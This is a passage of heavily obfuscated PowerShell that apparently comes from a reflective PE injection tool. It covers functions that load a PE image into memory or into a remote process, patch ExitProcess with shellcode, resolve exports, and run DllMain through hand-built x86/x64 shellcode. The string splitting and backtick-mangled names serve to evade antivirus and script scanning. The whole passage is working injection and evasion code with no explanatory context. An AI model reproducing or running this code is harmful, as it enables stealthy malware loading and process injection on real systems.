				    Throw ("{2}{1}{5}{4}{0}{3}" -f'rote',' to Virtu','Call','ct failed','lP','a')
			    }
			
			    
			    ${ExiTprOC`es`soriG`B`ytes`P`TR} =   ${Zf`I2`Wh}::("{3}{2}{0}{1}"-f'c','HGlobal','o','All').Invoke(${to`Tal`Size})
			    ${wIN32fUn`Ct`ions}."Me`mcPY"."INv`OKE"(${ExI`TProces`sorIgByTE`s`pTR}, ${prOc`EX`IT`Fu`N`ctio`NADDR}, [UInt64]${tOt`ALsI`ZE}) | &("{1}{0}{2}" -f't-','Ou','Null')
			    ${r`EtuRnaR`Ray} += ,(${Proc`EXitFun`c`TioNAddR}, ${eX`iTpr`OCeSsORiGB`y`Tes`P`TR}, ${T`oTaLSI`ze})
			
			    
			    
			    &("{0}{2}{4}{1}{3}" -f 'W','oMem','rite-Byt','ory','esT') -Bytes ${sH`ELlcod`e1} -MemoryAddress ${PrO`CexIT`F`UNC`TIONAddR`T`MP}
			    ${pRoCEXITFun`Cti`OnA`DD`R`T`MP} = &("{1}{2}{0}{6}{4}{5}{3}" -f'd-Sign','A','d','d','Unsi','gne','edIntAs') ${PrO`c`e`xITFuNcTiOnADDr`TMP} (${sHEl`lCoD`e1}."L`e`NGTh")
			     ${zfI`2wh}::("{3}{0}{1}{2}" -f 'ctur','e','ToPtr','Stru').Invoke(${Ex`E`dO`Ne`BYtEPTR}, ${p`RoC`EXi`TFuNcTion`A`DD`Rtmp}, ${fa`l`SE})
			    ${P`Roc`E`xI`TFU`N`ctI`onAdDRtmP} = &("{2}{0}{1}{3}{4}"-f'i','gn','Add-S','edIntAsUnsig','ned') ${PrO`CExItfUnC`Ti`On`ADdr`T`MP} ${pTRsI`ZE}
			    &("{2}{1}{4}{0}{3}" -f'ytesToMemo','r','W','ry','ite-B') -Bytes ${sh`ElL`COdE2} -MemoryAddress ${Pr`OC`EXiT`FuN`CTi`oN`ADDrtmP}
			    ${PR`OCexITfUnCt`iOn`ADD`RTmP} = &("{3}{1}{0}{2}{4}"-f '-Sign','dd','edInt','A','AsUnsigned') ${P`Roce`XITFunct`Io`NAD`dRTMP} (${shellcO`d`E2}."leN`GTh")
			      (  &("{1}{0}{2}" -f 'IlDi','Ch','TEM') ('vAriA'+'blE:ZF'+'i'+'2Wh'))."vA`lUe"::("{3}{2}{1}{0}{4}" -f 'ureTo','t','truc','S','Ptr').Invoke(${exiT`THr`EadAD`DR}, ${p`RO`Ce`x`ITf`Unct`IonADDRtmp}, ${Fa`L`sE})
			    ${p`R`ocex`i`TFU`NCtIo`NADdRTmP} = &("{3}{1}{0}{6}{2}{4}{5}" -f'In','ned','sUns','Add-Sig','i','gned','tA') ${Proc`ExI`Tf`UnCT`ioNAdd`RTmP} ${p`Trsi`ze}
			    &("{2}{4}{1}{0}{3}"-f 'Memo','tesTo','W','ry','rite-By') -Bytes ${sH`EL`LCOdE3} -MemoryAddress ${P`ROC`eXiTF`UnCTI`o`NADDRTMP}

			    ${W`i`N32fuNc`TIonS}."v`irtuaLp`RO`TE`Ct"."i`NV`oKE"(${pRoC`e`Xit`FUn`CTioNad`DR}, [UInt32]${tO`Tals`IzE}, [UInt32]${o`l`DpR`OTECt`Flag}, [Ref]${o`lDpRoTeCt`F`L`AG}) | &("{2}{1}{0}"-f'll','-Nu','Out')
		    }
		    

		    &("{3}{0}{2}{1}" -f'e','utput','-O','Writ') ${R`Et`URNARr`AY}
	    }
	
	
	    
	    
	    Function cOPy`-Ar`RAyo`FmemAddr`eSS`es
	    {
		    Param(
		    [Parameter(pOsITION = 0, ManDAToRY = ${T`RuE})]
		    [Array[]]
		    ${CoPy`iNfo},
		
		    [Parameter(pOSITiON = 1, mAnDATOrY = ${t`RuE})]
		    [System.Object]
		    ${WIn3`2`F`UNctI`OnS},
		
		    [Parameter(pOSItiON = 2, mandAtoRy = ${Tr`Ue})]
		    [System.Object]
		    ${wIn`32C`oNstAn`TS}
		    )

		    [UInt32]${Ol`d`pROtEC`TFlAg} = 0
		    foreach (${I`NFo} in ${C`oPyInfo})
		    {
			    ${Su`c`CESs} = ${w`I`N32fu`NCTIONs}."Vi`R`TUAl`ProtECt"."in`VoKE"(${IN`Fo}[0], [UInt32]${in`FO}[2], [UInt32]${wIn3`2`coNST`A`NTs}."P`Age`_ExE`CUte_rea`DWRiTe", [Ref]${o`LDProTEc`TFLag})
			    if (${SUcCe`ss} -eq ${F`AL`Se})
			    {
				    Throw ("{5}{4}{6}{1}{2}{0}{3}" -f' fa','alProt','ect','iled','Vir','Call to ','tu')
			    }
			
			    ${wIN`32FUnCT`i`o`NS}."M`eMCPY"."iNV`OKe"(${IN`FO}[0], ${i`NfO}[1], [UInt64]${i`NFo}[2]) | &("{0}{1}{2}"-f 'Ou','t-','Null')
			
			    ${WIn3`2fUnC`T`iONs}."vI`RtuAl`PrO`TEcT"."IN`VOke"(${iN`Fo}[0], [UInt32]${iN`Fo}[2], [UInt32]${OLdPRotEc`Tf`laG}, [Ref]${OlD`pRotE`CTFlag}) | &("{0}{1}" -f 'Out-Nu','ll')
		    }
	    }


	    
	    
	    
	    Function g`ET`-MEMoryproC`A`dd`Ress
	    {
		    Param(
		    [Parameter(poSitION = 0, mAnDATORY = ${t`Rue})]
		    [IntPtr]
		    ${PEhA`ND`le},
		
		    [Parameter(PoSitiON = 1, mAnDatORY = ${T`RUE})]
		    [String]
		    ${F`UnCt`I`On`NaMe}
		    )
		
		    ${W`IN3`2tYpes} = &("{0}{3}{1}{2}"-f 'Ge','Ty','pes','t-Win32')
		    ${w`IN32`c`o`NSTANTs} = &("{5}{3}{2}{4}{0}{1}" -f'Const','ants','in','-W','32','Get')
		    ${p`EInFo} = &("{1}{2}{4}{3}{0}"-f 'o','Get-PEDeta','ile','f','dIn') -PEHandle ${PeH`A`NdlE} -Win32Types ${W`In32`Typ`ES} -Win32Constants ${win3`2`C`OnStA`NTs}
		
		    
		    if (${pE`inFO}."I`mAgE_nt_heA`d`ERs"."Op`TIOn`Al`heAdEr"."EX`P`orTTABlE"."Si`ZE" -eq 0)
		    {
			    return  ${bq`Ta}::"ze`Ro"
		    }
		    ${expo`R`TtABl`EptR} = &("{3}{1}{2}{4}{5}{0}"-f 'd','d','Int','Add-Signe','AsUnsig','ne') (${pEhaN`D`LE}) (${peIn`Fo}."ImAge_NT_`h`EAD`E`Rs"."OptiOn`ALHEaD`er"."eXport`T`A`BlE"."Vir`T`UaladdrESs")
		    ${ExpO`RT`TablE} =   ${z`Fi2wH}::"P`TRT`oSTRu`cTURE"(${eX`poRttabl`eP`Tr}, [Type]${wIn`32`TYPES}."imaG`e_E`XpOrT_dI`REC`TORY")
		
		    for (${I} = 0; ${I} -lt ${EXpor`Tt`A`BLE}."nuMbe`Ro`FnAm`ES"; ${i}++)
		    {
			    
			    ${Na`m`EofFS`e`TpTR} = &("{0}{2}{3}{4}{1}" -f'Add-Sign','d','edI','ntAsU','nsigne') (${Pe`HA`NDlE}) (${exp`ORTTaB`lE}."ADD`R`E`s`SofNAMES" + (${i} *   (&("{1}{0}{2}" -f'et-VarIA','g','bLe')  ("zfI2W"+"h"))."v`AlUe"::"sI`Ze`of"([Type][UInt32])))
			    ${n`AMepTR} = &("{5}{3}{1}{4}{0}{2}" -f 'ntAsUnsi','d-Signed','gned','d','I','A') (${pehan`D`lE}) ( ${Z`FI`2WH}::"pTrTOS`T`RUCtuRE"(${N`AM`EO`FFsetptr}, [Type][UInt32]))
			    ${n`AMe} =   ${Z`Fi2wH}::("{3}{1}{2}{0}" -f 'nsi','trToSt','ringA','P').Invoke(${NameP`Tr})

			    if (${NA`Me} -ceq ${FUNC`Tion`NAme})
			    {
				    
				    
				    ${OR`d`INal`ptR} = &("{0}{5}{4}{2}{6}{3}{1}" -f'Ad','igned','g','Uns','-Si','d','nedIntAs') (${pEH`ANDlE}) (${ExpoRTT`A`BLe}."AdDr`eSS`oFNAMEoRd`In`ALS" + (${I} *  ${Z`Fi`2Wh}::"s`izE`OF"([Type][UInt16])))
				    ${fUNC`inD`EX} =  ${zF`I2`wH}::"P`TRToSTRUct`U`RE"(${o`Rd`iN`ALptr}, [Type][UInt16])
				    ${fUnc`oFFsET`A`DdR} = &("{0}{4}{2}{3}{1}" -f'Ad','d','dIntAs','Unsigne','d-Signe') (${p`EHAn`dlE}) (${E`xPo`RTta`Ble}."aD`dR`eS`SOFFUNc`T`iOns" + (${fUN`cI`NdEX} *  ${Z`FI2`Wh}::"SiZ`eoF"([Type][UInt32])))
				    ${FUN`Cof`FS`Et} =  ${Z`FI`2Wh}::"PT`RTO`STr`UcT`Ure"(${fu`NcoFfseT`Ad`Dr}, [Type][UInt32])
				    return &("{0}{5}{4}{3}{1}{2}"-f 'Add-Sig','tAsUns','igned','n','I','ned') (${p`eHAND`LE}) (${FuN`Co`Ff`sEt})
			    }
		    }
		
		    return  (  &("{1}{0}"-f'ble','VaRia')  ("{1}{0}"-f 'qTa','b')  -VAluE)::"z`ErO"
	    }


	    Function iN`VOkE-MeMO`R`y`lO`A`DLI`BRARy
	    {
		    Param(
		    [Parameter( POsiTIOn = 0, maNDATOrY = ${Tr`UE} )]
		    [Byte[]]
		    ${PebYT`ES},
		
		    [Parameter(pOsiTioN = 1, MANdATOrY = ${fA`l`Se})]
		    [String]
		    ${exe`Ar`Gs},
		
		    [Parameter(PosItION = 2, mANdAtOry = ${f`AL`se})]
		    [IntPtr]
		    ${rEM`OT`EprocH`AndlE}
		    )
		
		    ${p`TRSi`Ze} =   ( &("{3}{1}{2}{0}"-f 'bLE','arI','A','GET-v')  ('zfI'+'2'+'wH')  -vaLuE  )::"S`Iz`eOF"([Type][IntPtr])
		
		    
		    ${W`I`N32`COnsTAn`TS} = &("{2}{3}{0}{1}" -f 't','s','Get-Win','32Constan')
		    ${WIn32fUnc`T`iOnS} = &("{2}{0}{4}{5}{1}{3}"-f'un','ion','Get-Win32F','s','c','t')
		    ${w`in32t`YPeS} = &("{3}{2}{1}{0}" -f 'pes','Ty','in32','Get-W')
		
		    ${R`emotE`LO`AdING} = ${fAl`se}
		    if ((${R`EmotePRoch`A`NdLE} -ne ${N`ULl}) -and (${r`EmOtEP`Roc`hA`NDlE} -ne   (  &("{1}{2}{3}{0}"-f'e','GET-Va','r','IAbL')  ("BqT"+"A")  -ValueoNlY)::"ZE`RO"))
		    {
			    ${rE`Mo`TEloaDInG} = ${t`RUE}
		    }
		
		    
		    &("{0}{2}{1}" -f 'Wri','e','te-Verbos') ("{3}{8}{11}{4}{0}{1}{7}{2}{6}{9}{10}{5}{12}" -f 'E inf','orma','on','Gett','P',' ',' fro','ti','ing bas','m ','the','ic ','file')
		    ${PE`in`Fo} = &("{2}{1}{0}"-f 'PEBasicInfo','t-','Ge') -PEBytes ${p`ebYt`Es} -Win32Types ${w`in`32TypES}
		    ${ORI`Gina`lI`m`AgeB`ASe} = ${PeI`NfO}."O`RiG`I`NALImagEbaSE"
		    ${nxc`ompAt`iBLE} = ${TR`UE}
		    if ((${pei`NfO}."D`lLcHAraCt`e`RIS`Tics" -band ${win`32cO`N`STaNtS}."iMAg`e`_DllchArA`C`T`eRiS`TIcS`_nx_cOmpAT") -ne ${WiN3`2CO`NSt`An`Ts}."iMaG`e_`DlLCHa`RACTE`R`iSTiCs_nX_C`OMpAt")
		    {
			    &("{2}{1}{0}{3}"-f 'nin','ite-War','Wr','g') ("{4}{5}{3}{6}{1}{7}{10}{2}{0}{9}{8}" -f'P, ',' compatib','ith DE','s n','PE ','i','ot','le ','ssues','might cause i','w') -WarningAction ("{0}{1}"-f'Continu','e')
			    ${N`XcoM`patibLE} = ${f`ALSe}
		    }
		
		
		    
		    ${pRoce`sS`64b`It} = ${tR`UE}
		    if (${rEM`OtE`LOa`D`InG} -eq ${Tr`UE})
		    {
			    ${kE`RNE`L32h`ANdlE} = ${Win`32fuN`ctiO`NS}."GeTMODu`Le`H`ANDLE"."iNvo`Ke"(("{2}{0}{1}" -f 'rnel32.d','ll','ke'))
			    ${R`ESu`Lt} = ${wiN`3`2fUNCtI`ONs}."GE`TPr`OCaDD`Ress"."i`Nvo`Ke"(${Kern`EL32H`An`DlE}, ("{0}{2}{1}{4}{3}" -f'I','c','sWow64Pro','ss','e'))
			    if (${Re`Su`LT} -eq   ${BQ`TA}::"ZE`Ro")
			    {
				    Throw ((("{11}{0}{9}{4}{5}{1}{8}{13}{6}{10}{2}{7}{12}{14}{3}" -f'uldnnBqt loc','o','oce','it','te IsWow64Process',' functi','termine ','ss','n to d','a','if target pr','Co',' is 32b','e','it or 64b'))."RE`pLaCe"('nBq',[strIng][char]39))
			    }
			
			    [Bool]${WoW`64`PROcEss} = ${FAl`SE}
			    ${Su`cce`Ss} = ${Wi`N3`2FUNCT`Io`NS}."I`sWo`W64PR`OcESS"."inV`okE"(${REM`otEP`ROch`ANdle}, [Ref]${Wow64P`R`OC`ess})
			    if (${suC`C`ess} -eq ${F`AlSe})
			    {
				    Throw ("{6}{1}{5}{4}{2}{0}{3}"-f 's faile','ll to ','4Proces','d','Wow6','Is','Ca')
			    }
			
			    if ((${WOW64Pro`c`e`SS} -eq ${t`RUE}) -or ((${w`OW`64p`R`OcEss} -eq ${FAl`Se}) -and (  (  &('lS') ('VArI'+'aBl'+'E:ZFI2'+'Wh')  )."vA`luE"::"SIZe`OF"([Type][IntPtr]) -eq 4)))
			    {
				    ${P`RocEs`s`64BiT} = ${f`AlSE}
			    }
			
			    
			    ${powerSHEll6`4`B`IT} = ${tr`UE}
			    if (  ( &('ls')  ("{0}{1}{2}" -f 'VarIAb','LE:','zfI2wH')  )."vA`LuE"::"sIZ`E`of"([Type][IntPtr]) -ne 8)
			    {
				    ${p`OwershElL6`4b`It} = ${F`ALsE}
			    }
			    if (${PO`we`RShELL6`4BIT} -ne ${Proc`eSs64`B`it})
			    {
				    throw ("{5}{1}{18}{22}{10}{14}{13}{19}{7}{20}{0}{4}{24}{8}{11}{17}{12}{9}{6}{21}{15}{16}{2}{3}{23}" -f'u','erS','remot','e proces','re (x8','Pow',' l','tec','6','E being','st ','4) a',' P',' ','be','ed',' and ','s','hel','same archi','t','oad','l mu','s','6/x')
			    }
		    }
		    else
		    {
			    if (  ${Zf`i`2wh}::"SI`ZEof"([Type][IntPtr]) -ne 8)
			    {
				    ${pRoc`EsS6`4`BIt} = ${F`AL`Se}
			    }
		    }
		    if (${p`Roce`sS64BIT} -ne ${pE`infO}."pE64`B`IT")
		    {
			    Throw ((("{22}{5}{14}{2}{4}{15}{1}{3}{7}{6}{13}{12}{0}{23}{18}{11}{8}{21}{9}{17}{19}{10}{16}{20}"-f 'oc','t match ',' ','the arc','doesn{0','E p','o','hitecture ','ing','oa',' in ','e','pr','f the ','latform','}','(32/64','de','s b','d','bit)',' l','P','ess it i')) -F[chAR]39)
		    }
		

		    
		    &("{4}{3}{1}{0}{2}"-f 'o','te-Verb','se','ri','W') ("{7}{5}{17}{15}{12}{14}{4}{2}{3}{9}{8}{16}{11}{0}{13}{6}{1}{10}"-f' its ','s to','t','he',' for ','ca','r','Allo','d',' PE an',' memory','te','r','heade','y','ing memo',' wri','t')
		
		    [IntPtr]${lO`AdA`Ddr} =  ${b`QtA}::"ZE`RO"
		    if ((${p`E`iNFo}."DllCHAR`AcTERISt`i`cS" -band ${wIn3`2Co`N`sTA`NTS}."IM`AGE_dl`LchaRac`TE`RIst`i`c`s_dYN`AMiC`_b`ASE") -ne ${w`in3`2`cOnStaNts}."Ima`Ge_`dlL`c`hARAcT`E`RI`s`TIcS_d`yNA`MIc_ba`se")
		    {
			    &("{1}{2}{0}"-f '-Warning','W','rite') ("{17}{7}{6}{11}{12}{18}{8}{2}{5}{3}{1}{14}{10}{9}{0}{13}{16}{4}{15}"-f 'l','e','ble. If the loa',' try r','y','ding fails,',' ',' reflectively','R compati','rShel','e','loaded',' is not ',' and t','starting Pow','ing again','r','PE file being','ASL') -WarningAction ("{1}{0}{2}"-f 't','Con','inue')
			    [IntPtr]${L`OaDad`dr} = ${OR`IgiNA`l`IMAGe`BASE}
		    }

		    ${PEHa`Nd`LE} =   (  &("{1}{0}{3}{2}"-f 't-VaRi','GE','E','aBl') ("{0}{1}"-f'B','qta') -vA )::"Z`eRO"				
		    ${e`F`Fe`ctiVEp`EHANd`LE} =  ${b`qTA}::"Ze`Ro"		
		    if (${RemOTE`lO`A`D`InG} -eq ${TR`UE})
		    {
			    
			    ${P`EhAnD`LE} = ${WIN32f`U`NCti`o`Ns}."V`irtuaLAL`l`oC"."InVO`KE"(  ${Bq`Ta}::"Z`ERO", [UIntPtr]${pE`in`Fo}."SIzEOF`ima`Ge", ${Win32c`O`NS`TA`NTs}."me`m_`Commit" -bor ${Wi`N32CoNs`T`AnTs}."m`eM_reSe`RvE", ${wIN32cO`NST`Ants}."p`Ag`e_R`EADWr`ItE")
			
			    
			    ${e`Ff`ectiV`epeH`An`DLE} = ${W`iN32fu`Nc`TiONS}."virtu`A`LALlocEX"."Inv`Oke"(${r`emO`Te`p`RocHAN`DlE}, ${LoAda`D`dR}, [UIntPtr]${P`eIN`FO}."SiZ`EOf`imagE", ${wIn32co`NsT`A`NTS}."mE`M_C`OMMiT" -bor ${Win3`2cONs`TA`Nts}."mem`_Re`S`ERve", ${wiN`3`2coN`S`TAntS}."pag`E_eXECU`T`E`_reAdw`RiTe")
			    if (${ef`Fec`T`I`VEpEHAndLE} -eq   ${BQ`Ta}::"zE`RO")
			    {
				    Throw ((("{6}{30}{22}{18}{4}{13}{2}{23}{27}{3}{24}{17}{21}{19}{25}{20}{10}{15}{29}{26}{9}{14}{16}{8}{28}{12}{11}{5}{1}{0}{7}" -f's a','he PE i','s. If the PE ','ng l','mote pr','of t','Un','lready in use','a','quested b',', it c','s ','es','oces','a','o','se ','ed','ory in the re','Uct support A','LR',' doesnS',' allocate mem','be','oad','S','at the re','i','ddr','uld be th','able to')) -rePLacE  'SUc',[cHar]39)
			    }
		    }
		    else
		    {
			    if (${NX`comPa`Ti`BLE} -eq ${t`RUe})
			    {
				    ${P`ehan`Dle} = ${W`in`32f`UnC`TIONS}."VirtUAl`A`LLOc"."Invo`KE"(${LO`AdA`DdR}, [UIntPtr]${pE`IN`Fo}."SIzeo`Fi`MA`GE", ${W`IN32COn`STAN`TS}."m`EM_c`O`MMit" -bor ${Wi`N3`2Co`NsTANTS}."m`em_`R`esErvE", ${W`IN32`ConStAN`Ts}."PagE_`RE`A`dw`RitE")
			    }
			    else
			    {
				    ${pE`Han`DlE} = ${WIn3`2`FUNCTIO`Ns}."V`irTUaLAL`L`Oc"."IN`VOKE"(${LOA`Dad`Dr}, [UIntPtr]${pE`IN`Fo}."s`ize`OFima`ge", ${WIN3`2Cons`Ta`N`TS}."Mem`_C`oMMit" -bor ${WIn32`CO`NS`TA`NtS}."Mem_r`E`seRve", ${wIN32C`O`NS`TAN`Ts}."PAgE_E`x`ecUtE_reADWR`ItE")
			    }
			    ${EfF`Ec`T`I`VEpehaNDLe} = ${Peh`A`NdlE}
		    }
		
		    [IntPtr]${PE`EN`daD`d`ResS} = &("{1}{0}{2}{3}{4}" -f 's','Add-SignedIntA','Unsi','gn','ed') (${peHaN`Dle}) ([Int64]${P`E`info}."SIZeof`im`AGE")
		    if (${pEh`A`NdLE} -eq  (&("{1}{0}" -f 'M','Ite') ('vA'+'Ri'+'abL'+'e:BqT'+'a'))."Va`LuE"::"ZE`Ro")
		    { 
			    Throw (("{45}{22}{2}{57}{13}{15}{51}{24}{49}{26}{27}{29}{40}{56}{8}{9}{38}{14}{0}{4}{39}{42}{7}{41}{46}{18}{5}{23}{36}{33}{10}{34}{32}{12}{43}{47}{48}{28}{16}{19}{35}{11}{52}{54}{3}{44}{37}{1}{53}{30}{17}{31}{55}{50}{21}{20}{6}{25}"-f'r PE. If ','e ','ua','layout','PE','ng t','ht ','ASLR compat','cat','e me','p','different ','new Powe','Al','y fo','lo','proce','ss th','runni','ss will','g','i','irt','he s','a','be free).','ed ','t','ew PowerShell ','o','e','e PE',' a ','i','t in',' have a ','cr','o th','mor',' is',' al','ible, t',' not ','rShel',', s','V','ry ','l ','process (the n','il','ts m','c f','m','addr','emory ',' wan','lo','l'))
		    }		
		      ${ZfI2`wh}::("{1}{0}"-f 'y','Cop').Invoke(${pe`BYt`es}, 0, ${P`e`HaNdlE}, ${p`eiNfO}."SIze`o`Fh`EADERs") | &("{1}{2}{0}" -f 'l','Out-Nu','l')
		
		
		    
		    &("{0}{3}{2}{1}" -f'Write-Ver','e','os','b') ("{13}{6}{14}{3}{15}{16}{4}{5}{0}{11}{7}{2}{10}{1}{8}{9}{12}"-f 'mation','aded i','aders ','led PE ','o','r','etting ','the he','n m','emo','lo',' from ','ry','G','detai','i','nf')
		    ${PeI`Nfo} = &("{1}{0}{4}{2}{5}{3}" -f 'et-PED','G','i','o','eta','ledInf') -PEHandle ${P`ehanD`Le} -Win32Types ${win3`2T`ypes} -Win32Constants ${wi`N`32cOn`S`TaNts}
		    ${p`einfO} | &("{1}{2}{0}"-f'r','Add','-Membe') -MemberType ("{1}{2}{0}"-f'ty','NotePro','per') -Name ("{1}{2}{0}" -f 's','En','dAddres') -Value ${p`EEnD`AD`DReSS}
		    ${pE`iNFO} | &("{2}{1}{0}"-f '-Member','dd','A') -MemberType ("{3}{0}{1}{2}"-f'o','pert','y','NotePr') -Name ("{0}{4}{2}{3}{5}{1}" -f'Ef','dle','c','tivePE','fe','Han') -Value ${EFfE`CTiVe`P`Ehandle}
		    &("{0}{2}{1}{3}" -f'Wri','erbo','te-V','se') ('StartAdd'+'ress'+': '+"$PEHandle "+' '+' '+' '+'End'+'Address:'+' '+"$PEEndAddress")
		
		
		    
		    &("{2}{0}{1}{3}"-f 'ite-Verb','os','Wr','e') ("{7}{2}{5}{1}{0}{6}{4}{3}" -f'i','ns ','s','y',' to memor','ectio','n','Copy PE ')
		    &("{2}{0}{1}" -f'Se','ctions','Copy-') -PEBytes ${PEby`T`eS} -PEInfo ${Pe`iNfO} -Win32Functions ${w`iN`32fU`N`ctionS} -Win32Types ${WI`N3`2Ty`PeS}
		
		
		    
		    &("{1}{2}{0}" -f'e','Write','-Verbos') ("{4}{12}{6}{3}{15}{2}{14}{11}{1}{16}{5}{8}{7}{10}{0}{13}{9}"-f' ','here the P',' ba','s','Updat',' l','mory addres','d','oade','mory',' in','d on w','e me','me','se','es','E was actually')
		    &("{5}{3}{0}{4}{1}{2}"-f'moryAddre','se','s','e','s','Update-M') -PEInfo ${Pe`InfO} -OriginalImageBase ${ORIG`InAli`mAgebA`sE} -Win32Constants ${win3`2C`ONsTaN`Ts} -Win32Types ${W`in`32`TYpes}

		
		    
		    &("{1}{2}{4}{3}{0}"-f'se','Writ','e','bo','-Ver') ((("{1}{6}{5}{7}{4}{3}{0}{2}"-f'ed by the PE we ','Im','are loading','{0}s need',' DLL','r','po','t'))  -f[CHar]39)
		    if (${RemoTeL`Oa`Ding} -eq ${t`RuE})
		    {
			    &("{2}{0}{1}{3}" -f 'mport-Dll','Import','I','s') -PEInfo ${PE`InFo} -Win32Functions ${WiN3`2FUN`C`Tio`Ns} -Win32Types ${WIn`32T`YpeS} -Win32Constants ${w`iN32`CO`Ns`TAntS} -RemoteProcHandle ${R`emOTepROChAn`d`LE}
		    }
		    else
		    {
			    &("{3}{1}{2}{0}" -f 'ports','-DllI','m','Import') -PEInfo ${pEI`Nfo} -Win32Functions ${wI`N32fUNC`T`Io`NS} -Win32Types ${WIN32`T`yPEs} -Win32Constants ${wI`N32cOn`S`TaN`Ts}
		    }
		
		
		    
		    if (${R`Em`OTE`LOAd`inG} -eq ${F`AlSE})
		    {
			    if (${nx`CO`MpatiBLE} -eq ${tR`Ue})
			    {
				    &("{2}{1}{0}{4}{3}" -f 'er','-V','Write','se','bo') ("{3}{5}{4}{0}{2}{1}{6}" -f'memory p','ct','rote','U',' ','pdate','ion flags')
				    &("{0}{3}{1}{6}{4}{5}{2}"-f'Up','-Mem','s','date','rotec','tionFlag','oryP') -PEInfo ${p`e`INFO} -Win32Functions ${wiN32F`U`N`CtI`ons} -Win32Constants ${wIn3`2`c`Ons`TaNTs} -Win32Types ${wIN3`2`TYPeS}
			    }
			    else
			    {
				    &("{2}{3}{0}{1}" -f'e-V','erbose','Wr','it') ("{1}{11}{5}{0}{6}{10}{19}{8}{9}{20}{3}{16}{21}{17}{18}{7}{13}{4}{12}{2}{14}{15}"-f 'l','P','as rea','tible with ','eping m',' ref','ec','y, k','oaded is not com','p','tively ','E being','emory ','e','d wr','ite execute','NX m','o','r','l','a','em')
			    }
		    }
		    else
		    {
			    &("{2}{1}{0}" -f'rbose','rite-Ve','W') ("{12}{1}{0}{11}{4}{10}{6}{5}{9}{7}{2}{3}{8}"-f'ing loade','E be','emory pe','rmi','n','i',', not adjust',' m','ssions','ng',' to a remote process','d i','P')
		    }
		
		
		    
		    if (${R`Em`OTELOAdi`Ng} -eq ${t`RuE})
		    {
			    [UInt32]${n`UmByTEsW`RI`TT`En} = 0
			    ${Suc`CE`Ss} = ${WIN`32`FUnctIoNS}."wRIT`e`PrOC`ESs`mE`MORy"."iNvo`Ke"(${RE`MOTEProCHAN`d`lE}, ${e`FFecTivePE`h`ANd`lE}, ${pE`HANDle}, [UIntPtr](${P`e`info}."s`izEoF`IMaGE"), [Ref]${nuMb`ytesw`RIt`TeN})
			    if (${suCc`e`ss} -eq ${fa`LsE})
			    {
				    Throw ("{4}{0}{1}{11}{6}{10}{7}{2}{5}{8}{3}{12}{9}"-f 'nable to wri','te s','te','s','U',' proc','llcode ','remo','e','ry.','to ','he','s memo')
			    }
		    }
		
		
		    
		    if (${Pei`NFO}."FIl`etyPE" -ieq "DLL")
		    {
			    if (${r`emotElo`AdI`Ng} -eq ${FAL`Se})
			    {
				    &("{2}{0}{3}{1}" -f 'er','e','Write-V','bos') ("{7}{0}{1}{11}{5}{6}{8}{12}{4}{3}{10}{9}{2}"-f 'li','n','d',' it','ws','s','o the DLL ','Cal','k','been loade',' has ','g dllmain ','no')
				    ${DL`Lm`Ai`NpTr} = &("{2}{4}{1}{0}{3}"-f'AsUnsigne','t','A','d','dd-SignedIn') (${pEin`Fo}."Pe`HAnD`LE") (${pe`in`Fo}."i`maGE_Nt_h`eAdERs"."oPtIO`NaL`h`EAdeR"."a`d`D`RE`SSofENTRYP`OInt")
				    ${DL`l`MAiN`deL`Egate} = &("{3}{2}{1}{0}"-f 'e','teTyp','Delega','Get-') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				    ${D`L`lmaIn} =  ${ZF`I2`Wh}::("{5}{2}{1}{4}{3}{0}{6}" -f 'ForFu','e','D','te','lega','Get','nctionPointer').Invoke(${dLLMAIn`p`TR}, ${D`l`LMaiNDE`LegaTe})
				
				    ${dLlM`A`IN}."inVO`KE"(${P`ei`Nfo}."P`EHANDle", 1,   ${b`qta}::"Z`eRO") | &("{1}{0}" -f't-Null','Ou')
			    }
			    else
			    {
				    ${dllm`AiNP`TR} = &("{3}{5}{1}{0}{2}{4}" -f 'nt','nedI','AsUnsign','Add-','ed','Sig') (${efFE`c`TIve`PEHAn`dle}) (${PEI`NfO}."i`maGE_`Nt_h`Ead`ers"."OPTI`onA`LHe`Ader"."adDr`esSOFEN`TR`ypoInt")
			
				    if (${Pe`iNFo}."P`E64BIT" -eq ${t`RUe})
				    {
					    
					    ${cAl`Ld`lL`maI`NSc1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					    ${CAlLDL`L`m`Ai`NSC2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					    ${C`ALlDLl`M`AiNsC3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    else
				    {
					    
					    ${c`Al`ldLLm`AinS`c1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					    ${caL`ldllMa`I`N`Sc2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					    ${caLl`dllmaIn`sC3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    ${S`clEng`Th} = ${calL`d`lLM`AINsc1}."LENg`Th" + ${Ca`LLDl`LMAINSC2}."LEng`TH" + ${c`ALldl`l`MaIn`sC3}."leN`Gth" + (${pTRS`i`ZE} * 2)
				    ${ScPS`MeM} =   ( &("{0}{2}{1}"-f 'vArI','BLE','A')  ("{0}{1}" -f'zFI','2WH'))."V`ALUE"::("{0}{2}{1}" -f'Al','al','locHGlob').Invoke(${s`CLEnGTh})
				    ${Sc`pS`MemO`RIGI`NAL} = ${sCP`SmEm}
				
				    &("{1}{4}{3}{2}{0}{5}"-f 'Memo','Wri','esTo','yt','te-B','ry') -Bytes ${cal`LD`lL`maiNsc1} -MemoryAddress ${S`cPsMEM}
				    ${sc`PS`mem} = &("{4}{3}{0}{1}{5}{2}"-f 'edIntAsU','nsign','d','n','Add-Sig','e') ${s`cpSMEM} (${CA`L`L`D`lLmAiNSc1}."LE`Ng`Th")
				      (&('LS') ("vA"+"rIAble:ZFi"+"2W"+"H"))."v`AluE"::("{1}{2}{4}{0}{3}"-f'eT','Str','uct','oPtr','ur').Invoke(${E`Ff`ectivep`eHA`N`DLE}, ${scp`s`MeM}, ${FAl`se})
				    ${sC`P`smeM} = &("{3}{0}{2}{5}{1}{4}" -f 'igne','nt','d','Add-S','AsUnsigned','I') ${SCPS`mEM} (${P`T`RSIZE})
